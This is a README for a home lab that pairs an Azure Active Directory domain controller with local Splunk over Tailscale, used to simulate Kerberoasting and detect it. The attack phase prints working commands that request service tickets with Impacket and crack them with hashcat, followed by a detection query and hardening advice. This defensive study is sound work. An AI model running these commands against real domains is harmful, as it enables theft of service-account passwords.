# Cloud-to-Local Hybrid Security Monitoring & Kerberoasting Lab

## 📌 Project Overview
This repository details the architecture and implementation of a hybrid Security Operations Center (SOC) home lab. The deployment bridges an enterprise **Active Directory environment hosted in the Azure Cloud** with a local **SIEM deployment running inside a VirtualBox Ubuntu environment**. 

The primary goal of this project is to simulate an advanced Active Directory exploit scenario (**Kerberoasting**), securely forward target enterprise security log events across internet boundaries using a network overlay mesh, and parse the data for indicators of compromise (IoCs).

---

## 🏗️ Architecture Design
The lab infrastructure eliminates traditional firewall edge exposures and complex routing configurations by building a cross-boundary overlay tunnel network.

*   **Cloud Infrastructure:** Windows Server 2022 Domain Controller (`shekharsrvr`) hosted in Azure Virtual Networks.
*   **Local Infrastructure:** Ubuntu Server VM running Splunk Enterprise SIEM within an isolated VirtualBox environment.
*   **Network Layer:** Private peer-to-peer overlay network mesh driven by **Tailscale** to securely tunnel data without exposing public ports.
*   **Log Engine:** Splunk Universal Forwarder deployed on the Domain Controller shipping structured event records over the encrypted tunnel.

---

## ⚡ Attack Phase: Kerberoasting Execution
The offensive phase highlights the inherent vulnerability of Kerberos Ticket Granting Service (TGS) authentication patterns linked to static service accounts.

1. **Target Provisioning:** An Active Directory user account (`SQLServiceAccount`) was provisioned with a custom Service Principal Name (SPN) mapping to simulate a databases instance:
   ```powershell
   New-ADUser -Name "SQLServiceAccount" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Enabled $true
   setspn -a MSSQLSvc/SQLServer.homelab.local:1433 SQLServiceAccount
   ```
2. **Ticket Extraction:** Leveraging low-privileged domain user credentials (`labattacker`), an offline ticket request was triggered over the network interface via Impacket's toolkit execution layer:
   ```bash
   impacket-GetUserSPNs homelab.local/labattacker:KaliAttack2026! -dc-ip <TARGET_IP> -request -outputfile hashes.txt
   ```
3. **Cryptographic Recovery:** The retrieved ticket hash (AES-256 type 18 structure) was optimized for password extraction dictionary validation using dictionary mapping rules:
   ```bash
   hashcat -m 18200 proper_hashcat.txt /usr/share/wordlists/rockyou.txt --force
   ```

---

## 🛡️ Detection Phase: Blue Team & SIEM Engineering
The defensive implementation captures operational forensic artifacts generated natively inside the Kerberos infrastructure engine.

### 🔬 Key Windows Audit Events
*   **Event ID 4769:** "A Kerberos service ticket was requested." This specific audit event acts as the primary telemetry anchor.
*   **Anomalous Flags:** Attack indicators include tracking high-frequency ticket requests targeted toward non-machine profiles from standard endpoints.

### 🔍 Splunk Security Queries
To isolate threat footprints within the **Splunk Search app UI**, the following security hunting analytics pipeline was deployed:

```splunk
index=main sourcetype=WinEventLog:Security EventCode=4769 
| search TargetUserName!="*$" 
| stats count by src_ip, TargetUserName, ServiceName, TicketEncryptionType
```

#### Field Interpretations:
*   **`TargetUserName`**: Traces back to the malicious user profile request initiator (`labattacker`).
*   **`ServiceName`**: Points directly to the targeted entity resource (`SQLServiceAccount`).
*   **`TicketEncryptionType`**: Monitors cryptographic negotiation (`0x12` for AES-256).

---

## 🚀 Remediation & Hardening Strategies
To completely mitigate this threat vector within the enterprise directory domain, the following architecture configurations are recommended:
1. **Group Managed Service Accounts (gMSAs):** Migrate traditional service accounts to gMSAs. This shifts password management to Active Directory, enforcing randomly generated 240-character strings that neutralize offline dictionary attacks.
2. **Password Complexity Policies:** Enforce high-entropy, multi-character passphrases (25+ characters) specifically on standard user accounts linked to active SPNs.
